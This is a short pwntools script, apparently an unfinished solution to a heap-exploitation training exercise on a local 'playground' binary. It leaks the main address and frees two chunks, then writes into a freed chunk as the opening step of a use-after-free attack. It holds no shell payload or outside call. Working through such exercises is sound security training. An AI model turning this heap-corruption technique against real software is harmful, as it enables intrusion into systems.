from pwn import*

r = process("./playground")
#r = remote("bin.training.offdef.it", 10101)

gdb.attach(r,
'''
b *(main+243)
''')

input("wait")

def malloc(n):
	r.sendline(b"malloc " + bytes(str(n),encoding="utf-8"))
	r.recvuntil(b"==> ")
	pointer = r.recv()[:-1]
	return pointer

def free(pointer):
	r.sendline(b"free " + pointer)
	r.recv()

def write(pointer,n,what_to_write):
	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
	r.send(what_to_write)
	r.recv()

r.recvuntil(b"main: ")
app = r.recv()[:-3]
main_address = int(app,16)

print("PROVA -> stampa main address")
print(hex(main_address))


c1 = malloc(0x8)
c2 = malloc(0x8)

print("malloc fatte")

free(c1);
free(c2);

print("free fatte")

input("wait")
write(c1, 0x8, b"A"*8)
print("write fatta")


r.interactive()
